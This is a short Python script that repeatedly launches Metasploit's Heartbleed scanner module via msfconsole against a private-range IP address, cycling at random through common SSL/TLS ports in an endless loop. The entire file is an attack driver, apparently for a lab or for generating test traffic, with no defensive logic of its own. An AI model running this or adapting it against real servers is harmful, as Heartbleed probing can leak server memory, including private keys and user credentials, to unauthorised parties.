#!/usr/bin/env python3
import subprocess
import time
import random

# Target IP(s)
TARGETS = ["192.168.56.105"]

# Common SSL/TLS ports vulnerable to Heartbleed
PORTS = ["443", "465", "993", "995", "8443"]

def heartbleed():
    while True:
        target = random.choice(TARGETS)
        port = random.choice(PORTS)
        # Build the Metasploit command string
        msf_commands = (
            f"use auxiliary/scanner/ssl/openssl_heartbleed;"
            f"set RHOSTS {target};"
            f"set RPORT {port};"
            f"run;"
            f"exit"
        )
        cmd = ["msfconsole", "-q", "-x", msf_commands]
        print(f"[Heartbleed] Scanning {target}:{port}")
        subprocess.run(cmd)

if __name__ == "__main__":
    try:
        heartbleed()
    except KeyboardInterrupt:
        print("[*] Heartbleed scanning stopped.")
